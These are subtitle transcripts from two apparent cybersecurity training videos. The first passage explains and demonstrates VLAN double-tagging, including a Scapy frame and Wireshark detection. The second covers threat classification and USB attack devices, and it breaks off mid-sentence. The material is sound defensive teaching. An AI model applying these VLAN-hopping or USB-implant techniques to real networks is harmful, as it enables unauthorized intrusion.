this.\n\n327\n00:17:09.610 --> 00:17:12.920\nSome very specific things\nneed to be happening so\n\n328\n00:17:12.920 --> 00:17:15.340\nthat this attack is actually effective.\n\n329\n00:17:15.340 --> 00:17:18.840\nOne is that you must be using\nthe native VLAN, or regular traffic,\n\n330\n00:17:18.840 --> 00:17:24.660\nwhich is not a good idea because\nthis can happen if you do that.\n\n331\n00:17:24.660 --> 00:17:29.030\nSo you wanna make sure that if\nyou are using the native VLAN\n\n332\n00:17:29.030 --> 00:17:32.140\non your switches that it's only for\nmanagement traffic.\n\n333\n00:17:32.140 --> 00:17:35.760\nAnd typically,\npeople will create a management VLAN and\n\n334\n00:17:35.760 --> 00:17:36.880\nput all their management stuff.\n\n335\n00:17:36.880 --> 00:17:39.109\nAnd nothing uses the native VLAN.\n\n336\n00:17:39.109 --> 00:17:43.960\nAll right so that's typically\nbest practices for this reason.\n\n337\n00:17:43.960 --> 00:17:46.473\nBut some people don't know that and\n\n338\n00:17:46.473 --> 00:17:50.256\ntheir employing the native VLAN so\nthis could occur.\n\n339\n00:17:50.256 --> 00:17:55.078\nAnd so what happens is when you are using\nthis native VLAN if I put these\n\n340\n00:17:55.078 --> 00:17:59.819\nmultiple tags on when the switch\nthat has that native VLAN on there,\n\n341\n00:17:59.819 --> 00:18:02.564\nreceives the tagged ethernet frames,\n\n342\n00:18:02.564 --> 00:18:07.245\nit says, that's the native VLAN and\nthen it strips that off.\n\n343\n00:18:07.245 --> 00:18:11.704\nIt strips away the tag and\nit goes what's in here.\n\n344\n00:18:11.704 --> 00:18:13.253\nIt's a broadcast traffic.\n\n345\n00:18:13.253 --> 00:18:14.425\nSweet, broadcast it out.\n\n346\n00:18:14.425 --> 00:18:15.804\nWell, where's it going?\n\n347\n00:18:15.804 --> 00:18:16.869\nWell, what does broadcast do?\n\n348\n00:18:16.869 --> 00:18:18.835\nSends it everywhere.\n\n349\n00:18:18.835 --> 00:18:21.887\nSo it broadcasts it even\nout of the trunk port.\n\n350\n00:18:21.887 --> 00:18:23.975\nSo out of the trunk port it goes,\nand where does it land up?\n\n351\n00:18:23.975 --> 00:18:25.526\nIn switch number 2.\n\n352\n00:18:25.526 --> 00:18:30.614\nSwitch 2 sees it and goes,\nlet me take a look at this.\n\n353\n00:18:30.614 --> 00:18:34.587\nVLAN 20, cuz the first VLAN\n1 has been stripped away.\n\n354\n00:18:34.587 --> 00:18:35.690\nWhat's left?\n\n355\n00:18:35.690 --> 00:18:37.558\nThe next VLAN that I've\ndouble tagged it with.\n\n356\n00:18:37.558 --> 00:18:39.210\nSo that's double-tagging.\n\n357\n00:18:39.210 --> 00:18:42.010\nThat's me adding multiple tags,\nor two tags, so\n\n358\n00:18:42.010 --> 00:18:44.970\nthat it would strip that first\ntag away on that native VLAN.\n\n359\n00:18:44.970 --> 00:18:49.640\nBy the time it gets to that second\nswitch all it sees is that second tag,\n\n360\n00:18:49.640 --> 00:18:52.210\nwhich is the intended\nVLAN that I wanna be on.\n\n361\n00:18:52.210 --> 00:18:57.740\nSo now I'm able to hop from VLAN to\nVLAN using this double-tagging ability.\n\n362\n00:18:57.740 --> 00:19:03.311\nSo as you can see, attacker one is\non VLAN one, adds tag for VLAN 20.\n\n363\n00:19:03.311 --> 00:19:07.990\nStep two, SwitchA receives the frame and\nstrips the native VLAN tag.\n\n364\n00:19:07.990 --> 00:19:13.210\nSwitch three, or SwitchA sends frame\nto SwitchB over the trunk line.\n\n365\n00:19:13.210 --> 00:19:18.810\nAnd then SwitchB sees the VLAN20 tag and\ndelivers the frame to the victims, right?\n\n366\n00:19:18.810 --> 00:19:20.728\nSo anything that was attached,\nbecause it's broadcast traffic.\n\n367\n00:19:20.728 --> 00:19:24.082\nOr if you knew the IP of the victim\nthat you wanted to go for,\n\n368\n00:19:24.082 --> 00:19:26.180\nyou could put that in as well.\n\n369\n00:19:26.180 --> 00:19:30.423\nBut there you go,\nthat's basically how this works.\n\n370\n00:19:30.423 --> 00:19:33.050\nAnd I just didn't want to\nleave you with just that.\n\n371\n00:19:33.050 --> 00:19:35.858\nThat's very theoretical, thanks Daniel.\n\n372\n00:19:35.858 --> 00:19:38.038\n&gt;&gt; [LAUGH]\n&gt;&gt; I don't have the switches and\n\n373\n00:19:38.038 --> 00:19:39.520\neverything to make this work.\n\n374\n00:19:39.520 --> 00:19:41.000\nPlus it's really, really hard because\n\n375\n00:19:42.000 --> 00:19:47.600\ngood practice is to anything that's not\na trunk port set it up as an access port.\n\n376\n00:19:47.600 --> 00:19:50.870\nThat's standard practice for\nthis very reason.\n\n377\n00:19:50.870 --> 00:19:55.205\nAnd I think most modern switches from,\nat least Cisco switches do,\n\n378\n00:19:55.205 --> 00:20:00.670\nthey default to access ports.\n\n379\n00:20:00.670 --> 00:20:01.760\nSo that's a good thing.\n\n380\n00:20:01.760 --> 00:20:04.120\nCisco is looking out for us.\n\n381\n00:20:04.120 --> 00:20:08.180\nBut you as an administrator could've\nbeen in there and said you know what?\n\n382\n00:20:08.180 --> 00:20:13.520\nI need to set this as switch port\nmode dynamic desirable, right?\n\n383\n00:20:13.520 --> 00:20:16.460\nAnd then if I fool it into thinking I'm\na trunk, it'll become a trunk link.\n\n384\n00:20:17.590 --> 00:20:22.070\nRight, this is also a possibility\nthat you could do to send it trunking\n\n385\n00:20:23.960 --> 00:20:27.140\ninformation like you were another\nswitch trying to form a trunk.\n\n386\n00:20:27.140 --> 00:20:29.820\nIf it's set to dynamic\ndesirable it's gonna go hey,\n\n387\n00:20:29.820 --> 00:20:31.510\nthat switch wants to be a trunk.\n\n388\n00:20:31.510 --> 00:20:35.310\nLet's trunk it up cuz it's\nlike an automatic thing.\n\n389\n00:20:35.310 --> 00:20:37.490\nSo there's a misconfiguration\nthere being done.\n\n390\n00:20:37.490 --> 00:20:41.230\nOr maybe you hardcoded in,\nthis is not an access port,\n\n391\n00:20:41.230 --> 00:20:44.020\nit's gonna accept these types of packets.\n\n392\n00:20:44.020 --> 00:20:47.500\nSo if that happens,\nthat's what you gotta worry about.\n\n393\n00:20:47.500 --> 00:20:49.010\nSo mostly the time, like I said,\n\n394\n00:20:49.010 --> 00:20:51.590\nit'll gonna be a really hard\nthing to pull off in the wild.\n\n395\n00:20:51.590 --> 00:20:55.130\nNot gonna see it but you do need to\nknow about it because it is possible and\n\n396\n00:20:55.130 --> 00:20:57.350\nit is specific to switches itself.\n\n397\n00:20:57.350 --> 00:21:02.170\nI'm gonna pull out right here we're gonna\ngo to Kali and I'm gonna bring up a little\n\n398\n00:21:02.170 --> 00:21:07.130\ntool called Scapy, C-A-P-Y, like so.\n\n399\n00:21:07.130 --> 00:21:10.740\nAnd it's basically an interesting\nversion of Python or\n\n400\n00:21:10.740 --> 00:21:14.905\na tool that's built Around python,\nthis is very python-ish.\n\n401\n00:21:14.905 --> 00:21:18.655\nAnd you'll notice, can't import\npython blah blah blah, ecdsa lib,\n\n402\n00:21:18.655 --> 00:21:22.280\ndisabled certification manipulation tools,\nright?\n\n403\n00:21:22.280 --> 00:21:26.770\nSo there's just kind of some built in\nfunctionality to scapy that's specific for\n\n404\n00:21:26.770 --> 00:21:30.470\nworking with packets and frames and\nanything to do with network.\n\n405\n00:21:30.470 --> 00:21:32.180\nRight, so that you can manipulate those.\n\n406\n00:21:33.205 --> 00:21:36.880\nBut also, let me get another terminal up\nhere really quickly because having this in\n\n407\n00:21:36.880 --> 00:21:39.860\nis going to be brutal to watch me do,\nso I'm just going to copy.\n\n408\n00:21:39.860 --> 00:21:44.510\nI typed it in earlier, created a file,\nand I'll copy and paste it in here,\n\n409\n00:21:44.510 --> 00:21:46.340\nso we can just walk through it.\n\n410\n00:21:46.340 --> 00:21:48.515\nSee what's going on.\n\n411\n00:21:48.515 --> 00:21:52.571\nWindow, and you don't have to see this,\nso I'm just going to caps.\n\n412\n00:21:52.571 --> 00:21:55.711\nI think I called it VLAN,\n\n413\n00:21:55.711 --> 00:22:00.505\nyeah that's it, open, there we go.\n\n414\n00:22:00.505 --> 00:22:06.520\nJust grab the string of insane text,\ncopy, there we go.\n\n415\n00:22:06.520 --> 00:22:07.830\nNow I can paste it in here.\n\n416\n00:22:09.870 --> 00:22:11.830\nAnd it sent the package that's\nokay well send it again.\n\n417\n00:22:13.210 --> 00:22:14.010\nSo what's going on?\n\n418\n00:22:14.010 --> 00:22:17.030\nI've got this giant command\nat our beck and call here.\n\n419\n00:22:17.030 --> 00:22:23.220\nAnd basically what I'm telling Scapy\nto do is send this Ethernet frame here.\n\n420\n00:22:23.220 --> 00:22:26.190\nAnd we've got the destination.\n\n421\n00:22:26.190 --> 00:22:27.220\nWhere's it going?\n\n422\n00:22:27.220 --> 00:22:29.790\nAnybody know what a bunch of fs is?\n\n423\n00:22:29.790 --> 00:22:31.701\nMichael.\n&gt;&gt; I'm gonna gets us all ones.\n\n424\n00:22:31.701 --> 00:22:32.259\n&gt;&gt; Yeah.\n\n425\n00:22:32.259 --> 00:22:33.106\n&gt;&gt; Which will be our broadcast.\n\n426\n00:22:33.106 --> 00:22:33.868\n&gt;&gt; Yeah, that's right.\n\n427\n00:22:33.868 --> 00:22:37.324\nSo send us some broadcast traffic,\nsome basics, because I want to go out and\n\n428\n00:22:37.324 --> 00:22:38.729\nfind the place to send this to.\n\n429\n00:22:38.729 --> 00:22:46.560\nAll right, here is the source, this is the\nsource is my mac address for this device.\n\n430\n00:22:46.560 --> 00:22:51.252\nAnd then you'll notice the .1Q for\nVLAN one then .1Q only.\n\n431\n00:22:51.252 --> 00:22:54.680\nSee if I can't slide that over and\nmake it a little prettier.\n\n432\n00:22:54.680 --> 00:22:57.704\nThere we go, .1Q for VLAN20.\n\n433\n00:22:57.704 --> 00:23:01.635\nAnd then the IP address,\nyou'll notice again broadcasting.\n\n434\n00:23:01.635 --> 00:23:08.303\nAnd then the source is what is my IP\naddress, that's where it's coming from.\n\n435\n00:23:08.303 --> 00:23:11.680\nI'm just gonna send an ICMP message.\n\n436\n00:23:11.680 --> 00:23:14.506\nAnd out of interface ethernet 0.\n\n437\n00:23:14.506 --> 00:23:16.375\nNow when I hit that, it sent it already.\n\n438\n00:23:16.375 --> 00:23:17.984\nBut we can actually look\nat this in Wireshark.\n\n439\n00:23:17.984 --> 00:23:19.051\nWhat does it look like over the frame?\n\n440\n00:23:19.051 --> 00:23:22.166\nRemember, this all goes back\nto our packet analysis ideas,\n\n441\n00:23:22.166 --> 00:23:23.705\nbeing able to look at things.\n\n442\n00:23:23.705 --> 00:23:27.718\nSo if you were to see something like\nthis on your network, you'd be like,\n\n443\n00:23:27.718 --> 00:23:31.493\nsomeone is trying to do VLAN hopping\nwith a double tagging business.\n\n444\n00:23:31.493 --> 00:23:32.723\nThat's not good.\n\n445\n00:23:32.723 --> 00:23:34.814\nI need to look at this a little further.\n\n446\n00:23:34.814 --> 00:23:38.152\nSo let's fire up Wireshark,\nwhere are you at?\n\n447\n00:23:38.152 --> 00:23:42.213\nSniffing and spoofing,\nWireshark, there we go.\n\n448\n00:23:42.213 --> 00:23:45.009\nOkay, it's all good.\n\n449\n00:23:45.009 --> 00:23:49.413\nI think it was on ethernet 0, so\nwe'll capture packets there and\n\n450\n00:23:49.413 --> 00:23:54.630\nnow we will resend it and go toward,\nI like how things hide behind each other.\n\n451\n00:23:54.630 --> 00:23:57.305\nThere you go, there it is.\n\n452\n00:23:57.305 --> 00:23:58.050\nI will zoom in.\n\n453\n00:23:58.050 --> 00:24:02.470\nSince only one packet has been sent\nhas been sent over this network it's\n\n454\n00:24:02.470 --> 00:24:03.450\nreally easy to find.\n\n455\n00:24:03.450 --> 00:24:04.509\nWe like that.\n\n456\n00:24:04.509 --> 00:24:07.357\n&gt;&gt; Was going to say that's\nthe easiest you ever looked it up.\n\n457\n00:24:07.357 --> 00:24:11.765\n&gt;&gt; Awe man I will work with\nWireshack a bunch, it's all crazy.\n\n458\n00:24:11.765 --> 00:24:12.505\n&gt;&gt; No filters.\n\n459\n00:24:12.505 --> 00:24:14.280\n&gt;&gt; No who need filters.\n\n460\n00:24:14.280 --> 00:24:16.538\nYou need to know more about that,\ngo to our Wireshack show.\n\n461\n00:24:16.538 --> 00:24:18.133\nThey got plenty of that stuff in there.\n\n462\n00:24:18.133 --> 00:24:20.750\nWe are trying to make it easy for\ndemonstration purposes.\n\n463\n00:24:20.750 --> 00:24:24.421\nSo let's open this up here,\nand here we go.\n\n464\n00:24:24.421 --> 00:24:25.890\nAnd let's take a look.\n\n465\n00:24:25.890 --> 00:24:29.838\nMike, anything off the top of your head,\nor just from the first glance,\n\n466\n00:24:29.838 --> 00:24:33.689\nmight look interesting to you as\nsomeone who is looking for a problem?\n\n467\n00:24:33.689 --> 00:24:37.849\n&gt;&gt; Well yeah, I do see two,\nthose lines that start with 802.1q.\n\n468\n00:24:37.849 --> 00:24:38.745\n&gt;&gt; Yes.\n&gt;&gt; Virtual LAN.\n\n469\n00:24:38.745 --> 00:24:39.678\n&gt;&gt; That's right.\n\n470\n00:24:39.678 --> 00:24:40.850\nSo on Wireshark,\n\n471\n00:24:40.850 --> 00:24:45.480\nwe were able to pick up the fact that\nthere were multiple tags when it\n\n472\n00:24:45.480 --> 00:24:51.130\ncame to 802.1q which should be sending off\nred flags now that we know what that is.\n\n473\n00:24:51.130 --> 00:24:54.484\nIf we see this on our network, that\nshould be sending red flags off to us.\n\n474\n00:24:54.484 --> 00:24:59.412\nGoing, someone is attempting one of\nthose lovely double tagging VLAN hopping\n\n475\n00:24:59.412 --> 00:25:02.860\nbusiness I need to take a look\nat what's going on here.\n\n476\n00:25:02.860 --> 00:25:05.437\nGet a little further investigation going,\nright?\n\n477\n00:25:05.437 --> 00:25:07.099\nSo that's the interesting thing.\n\n478\n00:25:07.099 --> 00:25:10.981\nThat's how you can see it and\nwe can just kinda look in there and\n\n479\n00:25:10.981 --> 00:25:15.500\nsee if there's anything else\ninteresting other than VLAN.\n\n480\n00:25:15.500 --> 00:25:16.670\nSo nothing.\nBasically,\n\n481\n00:25:16.670 --> 00:25:19.944\nus being able to see those IDs\nare the most important part.\n\n482\n00:25:19.944 --> 00:25:22.958\nAnd so\nwe can recognize that double tagging or\n\n483\n00:25:22.958 --> 00:25:26.890\nVLAN hopping is at least being\nattempted on our network.\n\n484\n00:25:26.890 --> 00:25:29.590\n&gt;&gt; Yeah, and just understanding\nthat there really shouldn't be\n\n485\n00:25:29.590 --> 00:25:31.750\ntwo VLAN tags on a single packet, yeah.\n\n486\n00:25:31.750 --> 00:25:34.656\n&gt;&gt; Exactly, so there we go,\nthat's VLAN hopping and\n\n487\n00:25:34.656 --> 00:25:38.510\nVLAN double tagging all wrapped\nup in a pretty bow for you guys.\n\n488\n00:25:38.510 --> 00:25:39.680\nMike, I'm looking at our clock and\n\n489\n00:25:39.680 --> 00:25:40.960\nit looks like we don't have\na whole lot of time left.\n\n490\n00:25:40.960 --> 00:25:44.010\nSo I think this is probably a good\nlittle natural stopping spot for us.\n\n491\n00:25:44.010 --> 00:25:45.830\nWe'll have to pick up with a part four.\n\n492\n00:25:45.830 --> 00:25:47.640\n&gt;&gt; Part four coming your way then,\nI like it.\n\n493\n00:25:47.640 --> 00:25:49.436\nAll right Daniel, great stuff there.\n\n494\n00:25:49.436 --> 00:25:52.838\nReally good look at some of these\nvulnerabilities that we deal with with our\n\n495\n00:25:52.838 --> 00:25:56.618\nInner tactility devices, and we're taking\na look at that double tagging on the old\n\n496\n00:25:56.618 --> 00:26:00.800\nVLAN side, appreciate that, hope everybody\nout there enjoyed watching this one.\n\n497\n00:26:00.800 --> 00:26:03.730\nSigning off for ITPRO.TV,\nI've been your host, Mike Rodrick.\n\n498\n00:26:03.730 --> 00:26:04.390\n&gt;&gt; I'm Daniel Lowrie.\n\n499\n00:26:04.390 --> 00:26:06.597\n&gt;&gt; And we'll see you next time.\n\n500\n00:26:06.597 --> 00:26:12.638\n[MUSIC]\n\n501\n00:26:12.638 -->

Thanks for having me, Mike.\n\n12\n00:00:30.766 --> 00:00:34.761\nGlad to be back cranking out some more\nCySA+ for you good folks out there.\n\n13\n00:00:34.761 --> 00:00:37.939\nHopefully, that's what you tuned for,\nbecause we're not making bread today.\n\n14\n00:00:37.939 --> 00:00:39.030\n&gt;&gt; [LAUGH]\n&gt;&gt; No, no,\n\n15\n00:00:39.030 --> 00:00:41.184\nwe're gonna classify some threats for\nyou so\n\n16\n00:00:41.184 --> 00:00:45.219\nthat you're a little better prepared for\nthe exam, and as always, the real world.\n\n17\n00:00:45.219 --> 00:00:49.260\nThat being said,\nI say we just jump in and get at it.\n\n18\n00:00:49.260 --> 00:00:50.200\n&gt;&gt; Absolutely.\n\n19\n00:00:50.200 --> 00:00:52.940\n&gt;&gt; Unfortunately, Mike,\nI wanna go ahead and brace you.\n\n20\n00:00:52.940 --> 00:00:53.486\n&gt;&gt; Uh-oh.\n\n21\n00:00:53.486 --> 00:00:56.887\n&gt;&gt; We've been doing cool\ndemos all the time.\n\n22\n00:00:56.887 --> 00:00:58.629\nSo hopefully,\nthat's what you thought they were.\n\n23\n00:00:58.629 --> 00:01:01.055\n&gt;&gt; [LAUGH]\n&gt;&gt; [LAUGH] Hopefully you did as well.\n\n24\n00:01:01.055 --> 00:01:04.149\nThere is the red tape portion\nof things that you have to and\n\n25\n00:01:04.149 --> 00:01:08.533\na lot of it is just theoretical knowledge\nof brute force facts that you just have to\n\n26\n00:01:08.533 --> 00:01:10.098\nget bury it into your brain.\n\n27\n00:01:10.098 --> 00:01:14.036\nSo, this will probably be\na lot of memorization and\n\n28\n00:01:14.036 --> 00:01:16.334\ntheory on this type of stuff.\n\n29\n00:01:16.334 --> 00:01:19.130\nI will show you stuff as\nmuch as I possibly can,\n\n30\n00:01:19.130 --> 00:01:22.592\ncuz I like to show you things cuz,\nI'm a visual learner.\n\n31\n00:01:22.592 --> 00:01:26.890\nI know a lot of people are so I like to\ngo down that road as much as possible.\n\n32\n00:01:26.890 --> 00:01:29.316\nBut we will be doing some memorization.\n\n33\n00:01:29.316 --> 00:01:33.403\n&gt;&gt; And this part might not be as\nglamourous as some of the other stuff.\n\n34\n00:01:33.403 --> 00:01:36.282\nMaybe not quite as exciting, but\nit doesn't mean it's not important, right?\n\n35\n00:01:36.282 --> 00:01:40.369\nYou have to know the terminology,\none to pass the exam, right?\n\n36\n00:01:40.369 --> 00:01:42.572\nYou know there's gonna be\nquestions like that on the exam.\n\n37\n00:01:42.572 --> 00:01:47.133\nAnd two, to be able to talk to\nother security professionals,\n\n38\n00:01:47.133 --> 00:01:49.600\nintelligently about breaches.\n\n39\n00:01:49.600 --> 00:01:50.738\n&gt;&gt; Use the same vernacular.\n\n40\n00:01:50.738 --> 00:01:53.705\n&gt;&gt; Yes, you have to have a common\nlanguage in order to communicate, right?\n\n41\n00:01:53.705 --> 00:01:55.279\nThat's normal anywhere, and\n\n42\n00:01:55.279 --> 00:01:58.557\nthe same applies when we're\ntalking about the security field.\n\n43\n00:01:58.557 --> 00:02:02.505\nIt's one of the things I think that we've\nstruggled with a long time, Daniel, is.\n\n44\n00:02:02.505 --> 00:02:04.490\nBecause it's been not quite mainstream,\n\n45\n00:02:04.490 --> 00:02:07.752\nyou get different people using\ndifferent terms in different places.\n\n46\n00:02:07.752 --> 00:02:11.669\nAnd it's been hard to share thread\nanalysis from my organization with other\n\n47\n00:02:11.669 --> 00:02:12.593\norganizations.\n\n48\n00:02:12.593 --> 00:02:14.787\nSo this is maybe not as glamorous,\nbut just as important.\n\n49\n00:02:14.787 --> 00:02:17.592\n&gt;&gt; Yeah, so\nwhip out your red tape guns, and\n\n50\n00:02:17.592 --> 00:02:22.172\nget ready to do some applying of\nsaid red tape to your business here.\n\n51\n00:02:22.172 --> 00:02:24.331\nBut Mike, makes some really good points.\n\n52\n00:02:24.331 --> 00:02:28.005\nNow, the good news is there have been\nsome organizations that have attempted\n\n53\n00:02:28.005 --> 00:02:29.485\nto standardize these things.\n\n54\n00:02:29.485 --> 00:02:35.266\nBut when it comes to adoption, it's really\nup to the individual or the organization.\n\n55\n00:02:35.266 --> 00:02:36.616\nWhether they adopt it or not or\n\n56\n00:02:36.616 --> 00:02:39.702\ncontinue to use their own terminology\nin the back of their, or not.\n\n57\n00:02:39.702 --> 00:02:41.552\nBut I think for the exam,\n\n58\n00:02:41.552 --> 00:02:46.853\nthey typically lean heavily on things\nlike NIST and their definition.\n\n59\n00:02:46.853 --> 00:02:50.104\nSo we will lean heavily on that as well\nand we'll cover that when we get there.\n\n60\n00:02:50.104 --> 00:02:52.740\nBut right,\nnow we're talking about classifications.\n\n61\n00:02:52.740 --> 00:02:54.129\n&gt;&gt; Right.\n&gt;&gt; So where do we start?\n\n62\n00:02:54.129 --> 00:02:57.077\n&gt;&gt; So, we'll start off with the two\nmain categories of classification.\n\n63\n00:02:57.077 --> 00:02:59.957\nWe start out general and work our way\ndown to more focused things, right?\n\n64\n00:02:59.957 --> 00:03:04.234\nThe two general [COUGH] excuse me,\nclassifications that we have,\n\n65\n00:03:04.234 --> 00:03:07.434\nare known threats and\nunknown threats, right?\n\n66\n00:03:07.434 --> 00:03:11.381\nThreats that we know exist, and\nthen there's threats that we don't.\n\n67\n00:03:11.381 --> 00:03:13.180\nHow do we classify an unknown threat,\nwell get to that.\n\n68\n00:03:13.180 --> 00:03:15.410\n&gt;&gt; [LAUGH]\n&gt;&gt; [LAUGH] Cuz that was my next question.\n\n69\n00:03:15.410 --> 00:03:19.220\n&gt;&gt; Seems interesting, like if I\ndon't know that there's a threat,\n\n70\n00:03:19.220 --> 00:03:20.588\nhow do I classify that?\n\n71\n00:03:20.588 --> 00:03:21.249\n&gt;&gt; Yeah.\n\n72\n00:03:21.249 --> 00:03:22.690\n&gt;&gt; Is that Elvis?\n\n73\n00:03:22.690 --> 00:03:23.351\nHey!\n\n74\n00:03:23.351 --> 00:03:25.023\n[LAUGH]\n&gt;&gt; [LAUGH]\n\n75\n00:03:25.023 --> 00:03:26.149\n&gt;&gt; Let me redirect you.\n\n76\n00:03:26.149 --> 00:03:27.170\n&gt;&gt; Yeah a little distraction.\n\n77\n00:03:27.170 --> 00:03:28.309\n&gt;&gt; That's right.\n\n78\n00:03:28.309 --> 00:03:32.232\n&gt;&gt; But let's go ahead and start with\nthe easy one which is the known threats.\n\n79\n00:03:32.232 --> 00:03:33.266\n&gt;&gt; Okay.\n\n80\n00:03:33.266 --> 00:03:35.610\n&gt;&gt; All right now,\nthese are typically threats that,\n\n81\n00:03:35.610 --> 00:03:38.294\nif you ran a vulnerability scan,\nthey would pick them up.\n\n82\n00:03:38.294 --> 00:03:42.658\nBecause there are signatures,\nbecause we knew about them, right?\n\n83\n00:03:42.658 --> 00:03:44.922\nYou see the logic going behind this,\nand how it's kinda unfolding.\n\n84\n00:03:44.922 --> 00:03:48.342\nWe are aware that these threats exist,\nthey have been documented,\n\n85\n00:03:48.342 --> 00:03:52.434\nthey have been organized, they have\nbeen classified, they've been put away.\n\n86\n00:03:52.434 --> 00:03:56.532\nSo that we can do the same\nthing in our organization.\n\n87\n00:03:56.532 --> 00:04:00.494\nSo we typically lean on our\nvulnerability scanners, and\n\n88\n00:04:00.494 --> 00:04:03.556\nthings in that nature\nto do that workforce.\n\n89\n00:04:03.556 --> 00:04:07.632\nBut it is good for us to kinda have a good\ngeneral idea of why they're classified?\n\n90\n00:04:07.632 --> 00:04:10.256\nOr what it gets classified\nthe way it does?\n\n91\n00:04:10.256 --> 00:04:15.543\nSo let's bring that scope of known\nthreats down into more sub categories\n\n92\n00:04:15.543 --> 00:04:20.324\nof just again, more generalization,\nbut a little more detail.\n\n93\n00:04:20.324 --> 00:04:24.364\nI want to start up with\nphysical access threats, okay?\n\n94\n00:04:24.364 --> 00:04:28.718\nYou can't just think in the digital\nrealm 100% of the time.\n\n95\n00:04:28.718 --> 00:04:34.523\nYou have to think what if someone\nwere to come and steal things?\n\n96\n00:04:34.523 --> 00:04:37.148\nAnd one of our favorites, Mike,\nI know you like this one,\n\n97\n00:04:37.148 --> 00:04:38.981\nI do as well cuz I think it's brilliant.\n\n98\n00:04:38.981 --> 00:04:44.124\nWhat if someone were to\naccess the air-conditioning\n\n99\n00:04:44.124 --> 00:04:48.015\nsystem to my server room and destroy it.\n\n100\n00:04:48.015 --> 00:04:51.359\nPut a big stick down the fan and\nclog it up and stop it from working.\n\n101\n00:04:51.359 --> 00:04:52.497\nWhat would happen?\n\n102\n00:04:52.497 --> 00:04:56.005\n&gt;&gt; Obviously seems really crazy, right?\n\n103\n00:04:56.005 --> 00:05:00.133\nBut what a great way to attack a business,\ncuz who's securing the air-conditioning\n\n104\n00:05:00.133 --> 00:05:02.551\nunit sitting outside\nthe building up on the roof.\n\n105\n00:05:02.551 --> 00:05:04.490\n&gt;&gt; Exactly,\nyou have to think in this terms.\n\n106\n00:05:04.490 --> 00:05:05.545\nYou have to be,\n\n107\n00:05:05.545 --> 00:05:10.844\nis there unauthorized access capabilities\nof someone into the server room.\n\n108\n00:05:10.844 --> 00:05:16.741\nCan anybody and their brother just walk on\nin, and pour water all over my servers?\n\n109\n00:05:16.741 --> 00:05:20.944\nThat would be bad, but that is an actual\nthreat, and we know it does exist.\n\n110\n00:05:20.944 --> 00:05:25.681\nAnd, crazy as it may seem,\nthese things do happen from time to time.\n\n111\n00:05:25.681 --> 00:05:28.827\nThey're not typical, but they can occur.\n\n112\n00:05:28.827 --> 00:05:30.868\nSo you have to prepare for that, and\n\n113\n00:05:30.868 --> 00:05:33.738\nyou have to know that is\na physical type of threat.\n\n114\n00:05:33.738 --> 00:05:38.675\nAgain, going back to loss or theft,\na more common type of threat,\n\n115\n00:05:38.675 --> 00:05:40.449\nbut we do know about it.\n\n116\n00:05:40.449 --> 00:05:43.804\nSo mobile phones, we discussed\nthis at length in another episode.\n\n117\n00:05:43.804 --> 00:05:44.350\n&gt;&gt; Laptops.\n\n118\n00:05:44.350 --> 00:05:47.719\n&gt;&gt; Yeah, exactly, super easy to let\nthese things fall out of your pocket,\n\n119\n00:05:47.719 --> 00:05:49.331\nleave them in a car, or in a store.\n\n120\n00:05:49.331 --> 00:05:54.237\nOr somewhere else, at a bus station,\nor like a bus stop should I say.\n\n121\n00:05:54.237 --> 00:05:55.862\n&gt;&gt; [LAUGH]\n&gt;&gt; You're traveling great across the world\n\n122\n00:05:55.862 --> 00:05:56.689\nfor some strange reason.\n\n123\n00:05:56.689 --> 00:05:58.478\n&gt;&gt; Right, right.\n&gt;&gt; [LAUGH] Which may be, right,\n\n124\n00:05:58.478 --> 00:06:00.023\nmy dad was a Greyhound driver so.\n\n125\n00:06:00.023 --> 00:06:01.241\n[LAUGH]\n&gt;&gt; Absolutely, but\n\n126\n00:06:01.241 --> 00:06:02.436\nthat's a great way to travel.\n\n127\n00:06:02.436 --> 00:06:04.456\n&gt;&gt; That's right, it's fun,\nI had a good time with that.\n\n128\n00:06:04.456 --> 00:06:05.257\n&gt;&gt; Yeah.\n\n129\n00:06:05.257 --> 00:06:07.393\n&gt;&gt; But, you have to prepare for that.\n\n130\n00:06:07.393 --> 00:06:08.822\nWhat if that happens?\n\n131\n00:06:08.822 --> 00:06:13.839\nBut I've gotta be able to classify,\nokay, well that is a physical threat.\n\n132\n00:06:13.839 --> 00:06:16.056\nThat is a physical vulnerability.\n\n133\n00:06:16.056 --> 00:06:19.772\nI need to classify that in\nthe proper term, right?\n\n134\n00:06:19.772 --> 00:06:26.038\nWhat about if I have physical access\nto a machine, going back to that idea.\n\n135\n00:06:26.038 --> 00:06:29.729\nWes likes to say this, if I can touch your\nmachine, it's no longer your machine.\n\n136\n00:06:29.729 --> 00:06:33.131\n&gt;&gt; I love that, that's one of the ten\nimmutable laws of security from Microsoft.\n\n137\n00:06:33.131 --> 00:06:35.317\nThat I know they've kind of fallen out of,\n\n138\n00:06:35.317 --> 00:06:39.344\nthey maybe need to be updated to fit\nmodern time, but it's very true, right?\n\n139\n00:06:39.344 --> 00:06:41.711\nIf I can touch your machine,\nit's no longer your machine.\n\n140\n00:06:41.711 --> 00:06:45.223\n&gt;&gt; That's exactly right, if you go on\nthe Interwebs, as we like to call it,\n\n141\n00:06:45.223 --> 00:06:47.958\nyou can look for\nthis little thing called a rubber ducky.\n\n142\n00:06:47.958 --> 00:06:50.187\nAnd that's a fun thing to play with.\n\n143\n00:06:50.187 --> 00:06:55.831\nLittle USBs, or what if I just grab\nsome malware, slap it on a regular USB?\n\n144\n00:06:55.831 --> 00:06:58.499\nAnd now I have access to the server.\n\n145\n00:06:58.499 --> 00:07:01.751\nOr the workstation that\nhas access to the server.\n\n146\n00:07:01.751 --> 00:07:05.635\n&gt;&gt; It wasn't that long ago, one of\nthe Box Store we won't mention names, but\n\n147\n00:07:05.635 --> 00:07:08.672\nwhere somebody had taken a USB\nthumb drive into the store.\n\n148\n00:07:08.672 --> 00:07:11.249\nAnd they got all the demonstration\ncomputers out there.\n\n149\n00:07:11.249 --> 00:07:14.586\nAnd they will adapt to the actual\nnetwork of the Box Store.\n\n150\n00:07:14.586 --> 00:07:18.088\nSo through that, able to slap a USB,\nI'm just testing this machine out.\n\n151\n00:07:18.088 --> 00:07:20.631\nYeah, nobody's paying attention\nto what he's doing over there.\n\n152\n00:07:20.631 --> 00:07:21.885\nThey think maybe he's buying a computer.\n\n153\n00:07:21.885 --> 00:07:25.228\nHe throws that thumb drive in, infects\ntheir network, and gets remote access.\n\n154\n00:07:25.228 --> 00:07:27.074\n&gt;&gt; That's exactly how these things work.\n\n155\n00:07:27.074 --> 00:07:29.919\nThere's another little handy\ndevice called LAN Turtle.\n\n156\n00:07:29.919 --> 00:07:32.670\nAnd it's real interesting.\n\n157\n00:07:32.670 --> 00:07:35.283\nI like that thing, it's fun, I actually\nhave one, they're 